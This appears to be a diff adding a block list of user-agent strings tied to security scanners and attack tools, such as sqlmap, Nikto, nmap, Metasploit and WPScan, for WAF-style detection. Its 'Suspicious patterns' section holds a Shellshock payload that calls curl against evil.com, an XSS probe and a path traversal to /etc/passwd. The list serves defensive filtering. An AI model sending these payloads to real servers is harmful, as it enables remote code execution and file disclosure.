@@ -1,0 +1,85 @@
+# Malicious / Suspicious User-Agent Strings
+# These are commonly used by security scanners and are often blocked by WAFs
+
+# SQL Injection Tools
+sqlmap/1.0-dev
+sqlmap/1.4.7
+sqlninja/0.2.6-r1
+Havij
+pangolin
+
+# Vulnerability Scanners
+Nikto/2.1.6
+Nikto/2.5.0
+Acunetix
+Acunetix-WVS
+Acunetix Web Vulnerability Scanner
+
+# Network Scanners
+nmap NSE
+nmap-scripting-engine
+nmap
+Nmap Scripting Engine
+
+# Penetration Testing Tools
+Metasploit
+Metasploit Framework
+Metasploit/4.0
+w3af.org
+OWASP ZAP
+ZAP/2.11.1
+Burp Suite
+
+# WordPress Scanners
+WPScan
+WPScan v3.8.22
+wpscan
+WPScan v3.8.1
+
+# Directory Busters
+DirBuster
+dirbuster
+Gobuster
+gobuster/3.1
+
+# Web Crawlers (sometimes malicious)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
+python-requests/2.25.1
+curl/7.64.1
+Wget/1.20.3
+libwww-perl/6.15
+
+# Exploit Frameworks
+exploit
+masscan
+OpenVAS
+Nessus
+
+# Suspicious patterns
+() { :; }; /bin/bash -c "curl evil.com"
+<script>alert(1)</script>
+../../etc/passwd
+
+# Bot patterns
+Mozilla/5.0 (compatible; bot)
+Mozilla/5.0 (compatible; scanner)
+Python-urllib
+
+# Simple names (often scanners)
+scanner
+test
+security
+penetration
+
+# Empty or minimal
+-
+Mozilla
+HTTP
+
+# Known malicious tools
+havij
+appscan
+NetSparker
+Vega
+Skipfish
+Arachni
